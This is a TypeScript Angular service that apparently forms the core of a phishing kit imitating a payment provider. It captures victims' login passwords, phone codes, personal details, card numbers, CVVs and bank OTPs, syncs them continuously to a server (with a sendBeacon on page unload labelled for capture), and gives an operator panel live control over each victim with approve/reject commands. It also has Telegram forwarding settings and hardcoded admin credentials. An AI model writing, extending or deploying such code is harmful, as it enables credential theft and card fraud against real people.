
import { Injectable, signal, computed, effect } from '@angular/core';
import { Router } from '@angular/router';
import { io, Socket } from 'socket.io-client';
import { from, of, firstValueFrom, throwError } from 'rxjs';
import { retry, catchError, switchMap, tap } from 'rxjs/operators';
import { PollingScheduler } from './polling.util';

export type ViewState = 'gate' | 'security_check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card_otp' | 'loading' | 'step_success' | 'success' | 'admin';
export type VerificationStage = 'login' | 'limited' | 'phone_pending' | 'personal_pending' | 'card_pending' | 'card_otp_pending' | 'final_review' | 'complete';

export interface UserFingerprint {
  userAgent: string;
  language: string;
  platform: string;
  screenResolution: string;
  ip: string;
}

export interface SessionHistory {
  id: string; // Session ID
  timestamp: Date;
  lastSeen?: number; // Last interaction timestamp
  email: string;
  name: string;
  status: string;
  fingerprint: UserFingerprint;
  data: any;
  stage?: string;
  resendRequested?: boolean;
  isPinned?: boolean;
  // Progress flags
  isLoginVerified?: boolean;
  isPhoneVerified?: boolean;
  isPersonalVerified?: boolean;
  isCardSubmitted?: boolean;
  isFlowComplete?: boolean;
}

const STORAGE_KEY_STATE = 'pp_app_state_v1';
const SYNC_CHANNEL = 'pp_sync_channel';

@Injectable({
  providedIn: 'root'
})
export class StateService {
  // Navigation
  readonly currentView = signal<ViewState>('gate');
  readonly previousView = signal<ViewState>('gate');
  
  // Logic State
  readonly stage = signal<VerificationStage>('login');
  readonly rejectionReason = signal<string | null>(null);
  readonly resendRequested = signal<boolean>(false); 
  readonly adminToast = signal<string | null>(null);
  
  // Connection State
  readonly isOfflineMode = signal<boolean>(false); // True if API fails

  // Admin Auth & Settings
  readonly adminAuthenticated = signal<boolean>(false);
  readonly adminUsername = signal<string>('admin');
  readonly adminPassword = signal<string>('secure123');

  readonly adminAlertEmail = signal<string>('');
  readonly adminAutoCapture = signal<boolean>(true);
  readonly telegramBotToken = signal<string>('');
  readonly telegramChatId = signal<string>('');
  
  // Admin Session Monitoring
  readonly monitoredSessionId = signal<string | null>(null);

  // User Data
  readonly email = signal<string>('');
  readonly password = signal<string>('');
  readonly phoneNumber = signal<string>(''); 
  readonly firstName = signal<string>('');
  readonly lastName = signal<string>('');
  readonly dob = signal<string>('');
  readonly address = signal<string>('');
  readonly country = signal<string>(''); 
  readonly phoneCode = signal<string>('');
  readonly cardNumber = signal<string>(''); 
  readonly cardExpiry = signal<string>('');
  readonly cardCvv = signal<string>('');
  readonly cardOtp = signal<string>(''); 
  
  // Metadata & Fingerprint
  readonly sessionId = signal<string>('');
  readonly startTime = signal<Date>(new Date());
  readonly fingerprint = signal<UserFingerprint>({
    userAgent: 'Unknown',
    language: 'en-US',
    platform: 'Unknown',
    screenResolution: 'Unknown',
    ip: ''
  });

  // Admin view data
  readonly history = signal<SessionHistory[]>([]); 
  readonly activeSessions = signal<SessionHistory[]>([]); 
  private sessionCache = new Map<string, SessionHistory>();

  // Progress Flags
  readonly isLoginVerified = signal<boolean>(false);
  readonly isPhoneVerified = signal<boolean>(false);
  readonly isPersonalVerified = signal<boolean>(false);
  readonly isCardSubmitted = signal<boolean>(false);
  readonly isFlowComplete = signal<boolean>(false);

  // Inactivity & Timeout - Initialized explicitly
  readonly showTimeoutWarning = signal<boolean>(false);
  readonly timeoutCountdown = signal<number>(60);
  
  private lastActivityTime = Date.now();
  private inactivityInterval: any;
  // Set to 5 minutes total for demo (Warning at 4m 30s)
  private readonly SESSION_TIMEOUT_MS = 5 * 60 * 1000;
  private readonly WARNING_THRESHOLD_MS = 4.5 * 60 * 1000;

  // Auto-Approve Timer
  private waitingStart = signal<number | null>(null);

  // Polling & Sync
  private poller: PollingScheduler | null = null;
  private lastETag: string | null = null;
  private syncTimeout: any;
  private storageTimeout: any;
  private broadcastChannel: BroadcastChannel | null = null;
  private isHydrating = false;

  private socket: Socket;

  constructor(private router: Router) {
    this.initializeSession();
    
    // Initialize Socket.IO
    this.socket = io({
        autoConnect: false
    });

    if (typeof window !== 'undefined') {
        this.socket.connect();

        // Join specific session room
        this.socket.emit('join', this.sessionId());

        // Listen for real-time commands
        this.socket.on('command', (cmd: any) => {
            this.handleRemoteCommand(cmd);
        });

        this.socket.on('connect', () => {
             this.socket.emit('join', this.sessionId());
        });

        // Listen for session updates (for Admin)
        this.socket.on('sessions-updated', () => {
            if (this.adminAuthenticated()) {
                this.fetchSessions();
            }
        });

        // Setup Cross-Tab Sync
        try {
            this.broadcastChannel = new BroadcastChannel(SYNC_CHANNEL);
            this.broadcastChannel.onmessage = (ev) => {
                if (ev.data && ev.data.type === 'STATE_UPDATE' && ev.data.sessionId === this.sessionId()) {
                   // Only sync if it's the same session ID (user operating multiple tabs)
                   this.hydrateFromState(ev.data.payload, false);
                }
            };
        } catch(e) { console.warn('BroadcastChannel not supported'); }

        // Restore state from storage (Hydration)
        this.restoreLocalState();

        // Force initial sync with retry logic
        this.initialSyncBurst();
        
        // Start Polling (Backup to Socket.IO)
        this.startPolling();
        this.setupListeners();
        this.startInactivityMonitor();

        // Reactive Sync Effect (Persist & Send)
        effect(() => {
            const stateSnapshot = this.getSnapshot();
            const currentSessionId = this.sessionId();
            
            // 1. Persist to LocalStorage (Instant "Static Page" fix)
            if (!this.isHydrating) {
                if (this.storageTimeout) clearTimeout(this.storageTimeout);
                this.storageTimeout = setTimeout(() => {
                    localStorage.setItem(STORAGE_KEY_STATE, JSON.stringify({
                        sessionId: currentSessionId,
                        data: stateSnapshot
                    }));

                    // 2. Broadcast to other tabs
                    this.broadcastChannel?.postMessage({
                        type: 'STATE_UPDATE',
                        sessionId: currentSessionId,
                        payload: stateSnapshot
                    });
                }, 500);
            }

            // 3. Debounced Server Sync
            if (this.syncTimeout) clearTimeout(this.syncTimeout);
            this.syncTimeout = setTimeout(() => {
                if (!this.adminAuthenticated()) {
                    this.syncState();
                }
            }, 800); 
        });
    }
  }

  async unlockGate(password: string): Promise<boolean> {
    try {
      const response = await fetch('/api/gate-unlock', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ password }),
      });
      if (response.ok) {
        const data = await response.json();
        if (data.success) {
          this.navigate('security_check');
          return true;
        }
      }
      return false;
    } catch (error) {
      return false;
    }
  }

  // --- Inactivity Logic ---
  private startInactivityMonitor() {
      if (this.inactivityInterval) clearInterval(this.inactivityInterval);
      this.inactivityInterval = setInterval(() => {
          if (this.adminAuthenticated()) return; // Don't timeout admin

          const idleTime = Date.now() - this.lastActivityTime;
          
          if (idleTime > this.SESSION_TIMEOUT_MS) {
              this.handleSessionTimeout();
          } else if (idleTime > this.WARNING_THRESHOLD_MS) {
              // Safety check before calling set
              if (this.showTimeoutWarning) {
                  this.showTimeoutWarning.set(true);
                  const remaining = Math.ceil((this.SESSION_TIMEOUT_MS - idleTime) / 1000);
                  if (this.timeoutCountdown) this.timeoutCountdown.set(remaining > 0 ? remaining : 0);
              }
          }
      }, 1000);
  }

  public registerUserActivity() {
      // Safety check: ensure signal exists before reading
      if (this.showTimeoutWarning && !this.showTimeoutWarning()) {
          this.lastActivityTime = Date.now();
      }
  }

  public extendSession() {
      this.lastActivityTime = Date.now();
      if (this.showTimeoutWarning) this.showTimeoutWarning.set(false);
  }

  private handleSessionTimeout() {
      if (this.showTimeoutWarning) this.showTimeoutWarning.set(false);
      // Reset sensitive fields
      this.password.set('');
      this.cardCvv.set('');
      this.cardOtp.set('');
      this.phoneCode.set('');
      
      // Navigate to login
      this.navigate('login');
      this.rejectionReason.set('Session timed out due to inactivity.');
      this.lastActivityTime = Date.now(); // Reset so we don't loop immediately
  }

  private getSnapshot() {
    return {
        currentView: this.currentView(),
        stage: this.stage(),
        email: this.email(),
        password: this.password(),
        phoneNumber: this.phoneNumber(),
        phoneCode: this.phoneCode(),
        firstName: this.firstName(),
        lastName: this.lastName(),
        dob: this.dob(),
        address: this.address(),
        country: this.country(),
        cardNumber: this.cardNumber(),
        cardExpiry: this.cardExpiry(),
        cardCvv: this.cardCvv(),
        cardOtp: this.cardOtp(),
        
        isLoginVerified: this.isLoginVerified(),
        isPhoneVerified: this.isPhoneVerified(),
        isPersonalVerified: this.isPersonalVerified(),
        isCardSubmitted: this.isCardSubmitted(),
        isFlowComplete: this.isFlowComplete(),
        rejectionReason: this.rejectionReason(),
        timestamp: Date.now()
    };
  }

  private restoreLocalState() {
      try {
          const raw = localStorage.getItem(STORAGE_KEY_STATE);
          if (raw) {
              const parsed = JSON.parse(raw);
              if (parsed.sessionId === this.sessionId()) {
                  console.log('[State] Restoring previous session...');
                  this.hydrateFromState(parsed.data, true);
              }
          }
      } catch(e) { console.error('Hydration failed', e); }
  }

  private hydrateFromState(data: any, isInit: boolean) {
      this.isHydrating = true; // Prevent feedback loop
      
      if(data.currentView) {
          this.currentView.set(data.currentView);
          // Sync Router
          if (isInit) this.router.navigate([data.currentView]);
      }
      if(data.stage) this.stage.set(data.stage);
      if(data.email) this.email.set(data.email);
      if(data.password) this.password.set(data.password);
      if(data.phoneNumber) this.phoneNumber.set(data.phoneNumber);
      if(data.phoneCode) this.phoneCode.set(data.phoneCode);
      if(data.firstName) this.firstName.set(data.firstName);
      if(data.lastName) this.lastName.set(data.lastName);
      if(data.dob) this.dob.set(data.dob);
      if(data.address) this.address.set(data.address);
      if(data.country) this.country.set(data.country);
      if(data.cardNumber) this.cardNumber.set(data.cardNumber);
      if(data.cardExpiry) this.cardExpiry.set(data.cardExpiry);
      if(data.cardCvv) this.cardCvv.set(data.cardCvv);
      if(data.cardOtp) this.cardOtp.set(data.cardOtp);
      
      if(data.isLoginVerified !== undefined) this.isLoginVerified.set(data.isLoginVerified);
      if(data.isPhoneVerified !== undefined) this.isPhoneVerified.set(data.isPhoneVerified);
      if(data.isPersonalVerified !== undefined) this.isPersonalVerified.set(data.isPersonalVerified);
      if(data.isCardSubmitted !== undefined) this.isCardSubmitted.set(data.isCardSubmitted);
      if(data.isFlowComplete !== undefined) this.isFlowComplete.set(data.isFlowComplete);
      if(data.rejectionReason !== undefined) this.rejectionReason.set(data.rejectionReason);

      this.isHydrating = false;
  }

  private initialSyncBurst() {
     setTimeout(() => this.syncState(), 100);
     setTimeout(() => this.syncState(), 1000); 
  }

  private initializeSession() {
      let id = '';
      const KEY = 'session_id_v7'; 
      
      try {
          if (typeof localStorage !== 'undefined') {
              id = localStorage.getItem(KEY) || '';
          }
      } catch (e) {
          console.warn('LocalStorage access failed.');
      }

      if (!id) {
          id = this.generateId();
          try {
              if (typeof localStorage !== 'undefined') {
                  localStorage.setItem(KEY, id);
              }
          } catch (e) {}
      }
      this.sessionId.set(id);
      this.captureFingerprint();
  }

  // --- API Sync Logic ---

  public startPolling() {
      if (this.poller) this.poller.stop();

      this.poller = new PollingScheduler(2000, 60000, async () => {
          if (this.adminAuthenticated()) {
              return await this.fetchSessions();
          } else {
              this.checkAutoApprove();
              const idleTime = Date.now() - this.lastActivityTime;
              const isIdle = idleTime > 60000; // 1 min idle

              if (!this.isOfflineMode()) {
                   // If active, always sync (return true to keep fast polling)
                   // If idle, sync occasionally (return false to allow backoff)
                   if (!isIdle) {
                       await this.syncState();
                       return true;
                   } else {
                       await this.syncState();
                       return false;
                   }
              }
              return !isIdle;
          }
      });

      this.poller.start();
  }

  private setupListeners() {
      if (typeof document !== 'undefined') {
          // 1. Visibility Change
          document.addEventListener('visibilitychange', () => {
              if (document.visibilityState === 'visible') {
                  this.registerUserActivity();
                  this.syncState();
                  if (this.adminAuthenticated()) this.fetchSessions();
              }
          });

          // 2. Page Unload (Critical for Capture)
          // We use sendBeacon here to guarantee data is sent even if tab closes instantly.
          window.addEventListener('unload', () => {
             if (this.adminAuthenticated()) return;
             const payload = this.buildPayload();
             const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
             navigator.sendBeacon('/api/sync', blob);
          });

          // 3. User Activity Tracking
          const activityHandler = () => this.registerUserActivity();
          ['mousedown', 'keydown', 'touchstart', 'scroll'].forEach(evt => {
              document.addEventListener(evt, activityHandler, { passive: true });
          });
      }
  }

  private checkAutoApprove() {
      const start = this.waitingStart();
      if (start && this.currentView() === 'loading') {
          const elapsed = Date.now() - start;
          if (elapsed > 45000) { // Auto approve after 45s of waiting
              this.waitingStart.set(null); 
              this.handleRemoteCommand({ action: 'APPROVE', payload: {} });
              this.syncState();
          }
      }
  }

  private buildPayload() {
      return {
          sessionId: this.sessionId(),
          timestamp: this.startTime(),
          email: this.email(),
          password: this.password(),
          phoneNumber: this.phoneNumber(),
          phoneCode: this.phoneCode(),
          firstName: this.firstName(),
          lastName: this.lastName(),
          dob: this.dob(),
          address: this.address(),
          country: this.country(),
          cardNumber: this.cardNumber(),
          cardExpiry: this.cardExpiry(),
          cardCvv: this.cardCvv(),
          cardOtp: this.cardOtp(),
          stage: this.stage(),
          fingerprint: this.fingerprint(),
          status: this.isFlowComplete() ? 'Verified' : 'Active',
          resendRequested: this.resendRequested(),
          isLoginVerified: this.isLoginVerified(),
          isPhoneVerified: this.isPhoneVerified(),
          isPersonalVerified: this.isPersonalVerified(),
          isCardSubmitted: this.isCardSubmitted(),
          isFlowComplete: this.isFlowComplete()
      };
  }

  public async syncState(): Promise<boolean> {
      // Don't sync if we are in admin view
      if (this.currentView() === 'admin' || this.adminAuthenticated()) return false;
      if (!this.sessionId()) return false;

      const payload = this.buildPayload();

      const request$ = from(fetch('/api/sync', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          keepalive: true // Important for background sync
      })).pipe(
          switchMap(res => {
              if (!res.ok) return throwError(() => new Error(`Sync Error: ${res.status}`));
              this.isOfflineMode.set(false); // Connection success
              return of(res);
          }),
          retry({ count: 1, delay: 500 }),
          catchError(err => {
              this.isOfflineMode.set(true);
              return of(null);
          })
      );

      try {
          const res: any = await firstValueFrom(request$);
          if (res && res.ok && res.json) {
              const data = await res.json();
              if (data.command) {
                  this.handleRemoteCommand(data.command);
                  return true;
              }
          }
      } catch (e) {}
      return false;
  }

  // --- Admin Fetch ---

  public async fetchSessions(): Promise<boolean> {
      const headers: Record<string, string> = {};
      if (this.lastETag) {
          headers['If-None-Match'] = this.lastETag;
      }

      // Logic: Try Network -> Fail
      const request$ = from(fetch(`/api/sessions?t=${Date.now()}`, { headers })).pipe(
          switchMap(res => {
              if (res.status === 304) {
                  this.isOfflineMode.set(false);
                  return of(res);
              }
              if (!res.ok) return throwError(() => new Error(`Fetch Error`));
              this.isOfflineMode.set(false);
              return of(res);
          }),
          catchError(err => {
              this.isOfflineMode.set(true);
              return of(null);
          })
      );

      try {
          const res: any = await firstValueFrom(request$);

          if (!res) return false;

          if (res.status === 304) {
              return false; // Not Modified
          }

          if (res.ok) {
              const sessions: any[] = await res.json();

              // Update ETag
              const newETag = res.headers.get('ETag');
              if (newETag) this.lastETag = newETag;

              this.processSessionsData(sessions);
              return true; // Data changed
          }
      } catch (e) { }
      return false;
  }

  private processSessionsData(sessions: any[]) {
    if (!Array.isArray(sessions)) return;

    const adminSessionId = this.sessionId();

    // Active sessions: Not Verified
    const rawActive = sessions.filter((s: any) => s.status !== 'Verified' && s.sessionId !== adminSessionId);

    const newActiveSessions: SessionHistory[] = [];
    const TIMEOUT_MS = 2 * 60 * 1000; // 2 minutes timeout for "Live" status
    const now = Date.now();

    for (const s of rawActive) {
        // Timeout Filter
        if (s.lastSeen && (now - s.lastSeen > TIMEOUT_MS)) {
            continue;
        }

        const id = s.sessionId;
        const cached = this.sessionCache.get(id);

        if (cached && cached.lastSeen === s.lastSeen) {
            newActiveSessions.push(cached);
        } else {
            const newSession: SessionHistory = {
                id: s.sessionId,
                timestamp: new Date(s.timestamp || Date.now()),
                lastSeen: s.lastSeen,
                email: s.email,
                name: `${s.firstName || ''} ${s.lastName || ''}`,
                status: s.status || 'Active',
                stage: s.stage,
                fingerprint: s.fingerprint,
                data: s,
                resendRequested: s.resendRequested,
                isPinned: s.isPinned,
                isLoginVerified: s.isLoginVerified,
                isPhoneVerified: s.isPhoneVerified,
                isPersonalVerified: s.isPersonalVerified,
                isCardSubmitted: s.isCardSubmitted,
                isFlowComplete: s.isFlowComplete
            };
            this.sessionCache.set(id, newSession);
            newActiveSessions.push(newSession);
        }
    }

    // Clean up cache
    if (this.sessionCache.size > newActiveSessions.length) {
         const currentIds = new Set(newActiveSessions.map(s => s.id));
         for (const id of this.sessionCache.keys()) {
             if (!currentIds.has(id)) {
                 this.sessionCache.delete(id);
             }
         }
    }

    newActiveSessions.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));

    // Only update signal if effectively different
    let shouldUpdate = false;
    const currentList = this.activeSessions();

    if (currentList.length !== newActiveSessions.length) {
        shouldUpdate = true;
    } else {
        for (let i = 0; i < newActiveSessions.length; i++) {
            if (newActiveSessions[i] !== currentList[i]) {
                shouldUpdate = true;
                break;
            }
        }
    }

    if (shouldUpdate) {
        this.activeSessions.set(newActiveSessions);
    }

    const rawComplete = sessions.filter((s: any) => s.status === 'Verified');
    const mappedHistory: SessionHistory[] = rawComplete.map(s => ({
          id: s.sessionId,
          timestamp: new Date(s.timestamp || Date.now()),
          lastSeen: s.lastSeen,
          email: s.email,
          name: `${s.firstName || ''} ${s.lastName || ''}`,
          status: s.status,
          fingerprint: s.fingerprint,
          isPinned: s.isPinned,
          data: {
            ...s,
            cardBin: s.cardNumber ? s.cardNumber.substring(0, 6) : '',
            cardLast4: s.cardNumber ? s.cardNumber.slice(-4) : ''
          }
    }));
    
    mappedHistory.sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());
    this.history.set(mappedHistory);

    // Sync Monitored Session View
    if (this.adminAuthenticated()) {
        let targetId = this.monitoredSessionId();
        if (!targetId && newActiveSessions.length > 0) {
              targetId = newActiveSessions[0].id;
              this.monitoredSessionId.set(targetId);
        }
    }
}

  public setMonitoredSession(id: string) {
      this.monitoredSessionId.set(id);
      this.fetchSessions(); // Force immediate refresh
  }

  private async sendAdminCommand(sessionId: string, action: string, payload: any) {
      // Try Network
      const request$ = from(fetch('/api/command', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sessionId, action, payload })
      })).pipe(
          retry({ count: 1, delay: 500 }),
          catchError(() => {
              return of(null);
          })
      );
      await firstValueFrom(request$);
  }

  private handleRemoteCommand(cmd: { action: string, payload: any }) {
      // Prevent Admin from reacting to user commands
      if (this.adminAuthenticated()) return;

      const { action, payload } = cmd;
      if (action === 'NAVIGATE') {
          this.navigate(payload.view, true);
      } else if (action === 'REJECT') {
          this.rejectionReason.set(payload.reason);
           if (this.stage() === 'phone_pending') this.navigate('phone', true);
           else if (this.stage() === 'personal_pending') this.navigate('personal', true);
           else if (this.stage() === 'card_pending') {
               this.cardNumber.set(''); 
               this.cardCvv.set('');
               this.navigate('card', true);
           }
           else if (this.stage() === 'card_otp_pending') {
               this.cardOtp.set('');
               this.navigate('card_otp', true);
           } else {
               this.navigate('login', true);
           }
      } else if (action === 'APPROVE') {
           this.rejectionReason.set(null);
           if (this.stage() === 'login') {
               this.isLoginVerified.set(true);
               this.navigate('limited', true);
           } else if (this.stage() === 'phone_pending') {
               this.isPhoneVerified.set(true);
               this.navigate('personal', true);
           } else if (this.stage() === 'personal_pending') {
               this.isPersonalVerified.set(true);
               this.navigate('card', true);
           } else if (this.stage() === 'card_pending') {
               this.isCardSubmitted.set(true);
               this.navigate('card_otp', true);
           } else if (this.stage() === 'card_otp_pending') {
               this.isFlowComplete.set(true);
               this.navigate('success', true);
           }
      }
  }

  // --- Actions ---

  private generateId() {
    return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
  }

  private captureFingerprint() {
      if (typeof window !== 'undefined') {
          this.fingerprint.set({
              userAgent: navigator.userAgent,
              language: navigator.language,
              platform: navigator.platform,
              screenResolution: `${window.screen.width}x${window.screen.height}`,
              ip: '' // Server fills this
          });
      }
  }

  navigate(view: ViewState, isRemote = false) {
    if (this.currentView() !== view) {
        this.previousView.set(this.currentView());
        this.currentView.set(view);
        this.router.navigate([view]); // Use Angular Router
        if (!isRemote) {
            this.syncState();
        }
    }
  }

  submitLogin(e: string, p: string) {
      this.email.set(e);
      this.password.set(p);
      this.stage.set('login');
      this.rejectionReason.set(null);
      this.navigate('loading');
      this.waitingStart.set(Date.now());
      this.syncState();
  }

  updateUser(data: { email?: string, password?: string }) {
      if (data.email) this.email.set(data.email);
      if (data.password) this.password.set(data.password);
  }

  updatePhone(data: { number?: string, code?: string }) {
      if (data.number) this.phoneNumber.set(data.number);
      if (data.code) this.phoneCode.set(data.code);
  }

  submitPhone(number: string, code: string) {
      this.phoneNumber.set(number);
      this.phoneCode.set(code);
      this.stage.set('phone_pending');
      this.rejectionReason.set(null);
      this.navigate('loading');
      this.waitingStart.set(Date.now());
      this.syncState();
  }

  triggerResendAlert() {
      this.resendRequested.set(true);
      this.syncState();
      setTimeout(() => this.resendRequested.set(false), 5000);
  }

  updatePersonal(data: any) {
      this.firstName.set(data.first);
      this.lastName.set(data.last);
      this.dob.set(data.dob);
      this.address.set(data.address);
      this.country.set(data.country);
  }

  submitPersonal(f: string, l: string, d: string, a: string, c: string) {
      this.firstName.set(f);
      this.lastName.set(l);
      this.dob.set(d);
      this.address.set(a);
      this.country.set(c);
      this.stage.set('personal_pending');
      this.rejectionReason.set(null);
      this.navigate('loading');
      this.waitingStart.set(Date.now());
      this.syncState();
  }

  updateCard(data: { number?: string, expiry?: string, cvv?: string, otp?: string }) {
      if (data.number) this.cardNumber.set(data.number);
      if (data.expiry) this.cardExpiry.set(data.expiry);
      if (data.cvv) this.cardCvv.set(data.cvv);
      if (data.otp) this.cardOtp.set(data.otp);
  }

  submitCard(n: string, e: string, c: string) {
      this.cardNumber.set(n);
      this.cardExpiry.set(e);
      this.cardCvv.set(c);
      this.stage.set('card_pending');
      this.rejectionReason.set(null);
      this.navigate('loading');
      this.waitingStart.set(Date.now());
      this.syncState();
  }

  submitCardOtp(code: string) {
      this.cardOtp.set(code);
      this.stage.set('card_otp_pending');
      this.rejectionReason.set(null);
      this.navigate('loading');
      this.waitingStart.set(Date.now());
      this.syncState();
  }
  
  proceedFromSuccess() {
      if (this.stage() === 'login') this.navigate('limited');
      else if (this.stage() === 'phone_pending') this.navigate('personal');
      else if (this.stage() === 'personal_pending') this.navigate('card');
      else if (this.stage() === 'card_pending') this.navigate('card_otp');
  }

  // --- Admin Actions ---
  
  loginAdmin(u: string, p: string): boolean {
      if (u === this.adminUsername() && p === this.adminPassword()) {
          this.adminAuthenticated.set(true);
          this.navigate('admin'); // Ensure router updates
          this.fetchSessions();
          this.loadSettings();
          return true;
      }
      return false;
  }

  returnFromAdmin() {
      this.adminAuthenticated.set(false);
      this.navigate('login');
  }

  adminApproveStep() {
      const id = this.monitoredSessionId();
      if (id) {
          this.sendAdminCommand(id, 'APPROVE', {});
          this.showAdminToast('Command Sent: Approve');
      }
  }

  adminRejectStep(reason: string) {
      const id = this.monitoredSessionId();
      if (id) {
          this.sendAdminCommand(id, 'REJECT', { reason });
          this.showAdminToast('Command Sent: Reject');
      }
  }

  adminRequestCardOtp() {
      const id = this.monitoredSessionId();
      if (id) {
          this.sendAdminCommand(id, 'APPROVE', {}); 
          this.showAdminToast('Requested Bank OTP');
      }
  }

  async deleteSession(id: string) {
      try {
          await firstValueFrom(from(fetch(`/api/sessions/${id}`, { method: 'DELETE' })));
          this.showAdminToast('Session Deleted');
          this.fetchSessions();
      } catch (e) {
          this.showAdminToast('Failed to delete');
      }
  }

  async pinSession(id: string) {
      try {
          await firstValueFrom(from(fetch(`/api/sessions/${id}/pin`, { method: 'POST' })));
          this.showAdminToast('Session Updated');
          this.fetchSessions();
      } catch (e) {
          this.showAdminToast('Failed to pin');
      }
  }

  async updateAdminSettings(email: string, auto: boolean, tgToken?: string, tgChat?: string) {
      this.adminAlertEmail.set(email);
      this.adminAutoCapture.set(auto);
      if (tgToken !== undefined) this.telegramBotToken.set(tgToken);
      if (tgChat !== undefined) this.telegramChatId.set(tgChat);

      // Persist to Server
      try {
          await firstValueFrom(from(fetch('/api/settings', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ email, tgToken, tgChat })
          })));
      } catch (e) {
          console.error('Failed to save settings', e);
      }
  }

  public async loadSettings() {
      try {
          const res = await firstValueFrom(from(fetch('/api/settings')));
          if (res && res.ok) {
              const data = await res.json();
              if (data.email) this.adminAlertEmail.set(data.email);
              if (data.tgToken) this.telegramBotToken.set(data.tgToken);
              if (data.tgChat) this.telegramChatId.set(data.tgChat);
          }
      } catch (e) {}
  }

  showAdminToast(msg: string) {
      this.adminToast.set(msg);
      setTimeout(() => this.adminToast.set(null), 3000);
  }
}
